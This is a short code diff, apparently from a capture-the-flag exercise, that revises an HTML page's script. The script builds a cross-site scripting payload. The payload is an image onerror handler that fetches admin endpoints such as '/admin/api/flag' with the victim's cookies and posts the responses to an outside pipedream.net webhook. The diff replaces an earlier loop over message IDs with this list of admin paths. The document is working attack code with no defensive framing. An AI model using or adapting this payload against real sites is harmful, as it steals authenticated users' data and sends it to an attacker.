@@ -8,24 +8,25 @@
         <script>
             const WEBHOOK =
                 "https://eorpvwpcvsuauqy.m.pipedream.net";
+            const endpoints = [
+              '/admin/api/flag',
+              '/admin/flag',
+              '/api/admin/flag',
+              '/admin/api/messages',
+            ];
+
             const payload = `<img src=x onerror="
               async function run() {
                 const WEBHOOK = '${WEBHOOK}';
-                const results = [];
                 
-                // Try IDs 1 through 50
-                for (let id = 1; id <= 10; id++) {
-                  try {
-                    const res = await fetch('/api/messages/' + id, {credentials:'include'});
-                    if (res.ok) {
-                      const data = await res.json();
-                      results.push({id, data});
-                    }
-                  } catch(e) {}
-                  await new Promise(r => setTimeout(r, 200));
-                }
+                const results = await Promise.all(
+                  ${JSON.stringify(endpoints)}.map(async ep => {
+                    const res = await fetch(ep, {credentials:'include'});
+                    const text = await res.text();
+                    return {ep, status: res.status, text};
+                  })
+                );
                 
-                // Exfil everything found
                 await fetch(WEBHOOK, {
                   method: 'POST',
                   mode: 'no-cors',
